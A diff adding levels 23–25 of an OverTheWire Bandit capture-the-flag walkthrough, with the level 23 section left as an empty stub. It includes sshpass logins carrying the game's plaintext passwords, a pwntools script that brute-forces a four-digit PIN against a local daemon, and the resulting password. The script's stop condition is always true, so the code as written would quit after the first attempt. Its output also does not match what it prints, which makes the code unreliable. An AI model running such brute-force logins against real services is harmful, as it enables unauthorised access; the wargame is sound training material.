@@ -845,3 +845,90 @@ cat /etc/bandit_pass/$myname > /tmp/$mytarget
 The password of the next level is: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
 ```
 
+# Level 23 ---> Level 24
+
+A program is running automatically at regular intervals from cron, the time-based job scheduler.
+
+```bash
+    #!/bin/bash
+
+    #script issues 
+```
+
+# Level 24 ---> Level 25
+
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode.
+
+```bash
+    #!/bin/bash
+
+    sshpass -p "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" ssh bandit24@bandit.labs.overthewire.org -p 2220
+```
+
+- Once logged in, execute `cd $(mktemp -d)`, copy the script provided below, create a file with vi `filename.py`, and paste the script into it. 
+- Give it execute permission with `chmod +x filename.py` and run it with `./filename.py`. 
+
+Depending on how long the PIN is, it may take some time to find the correct PIN.
+
+This time, a Python script will be used to automate the program's interactions by using pwntools.
+
+```python
+    #!/usr/bin/python3
+    from pwn import *
+
+
+    p = remote('127.0.0.1', 30002)
+
+    for number in range(0, 9999):
+        code = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
+        if number < 10:
+            code += f" 000{number}"
+        elif (number >= 10 and number < 100):
+            code += f" 00{number}"
+        elif (number >= 100 and number < 1000):
+            code += f" 0{number}"
+        else:
+            code += f" {number}"
+
+        print(f"Trying {code} ...")
+        p.writeline(code.encode('latin-1'))
+        checker = p.clean(0.2).decode('latin-1').split(" ")
+
+        if checker != 'Wrong!' or checker != 'I':
+            break
+```
+- The function `remote(IP_ADRESS, PORT)` is used to connect to the given address and port. 
+- `p.writeline(code.encode('latin-1'))` sends the given string as bytes.
+- `p.clean(0.2)` receives the output.
+
+The program will run until the password is found from 0000 to 9999.
+
+```
+PIN code found gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1667
+[*] Closed connection to 127.0.0.1 port 30002
+```
+- When the password is found log out and execute the script below retrieve the password of the next level.
+
+```bash
+    #!/bin/bash
+
+    sshpass -p "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" ssh bandit24@bandit.labs.overthewire.org -p 2220 "nc -vn 127.0.0.1 30002 <<< 'gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1667'"
+```
+
+```                         _                     _ _ _
+                        | |__   __ _ _ __   __| (_) |_
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+
+
+                      This is an OverTheWire game server.
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-1
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+Connection to 127.0.0.1 30002 port [tcp/*] succeeded!
+```
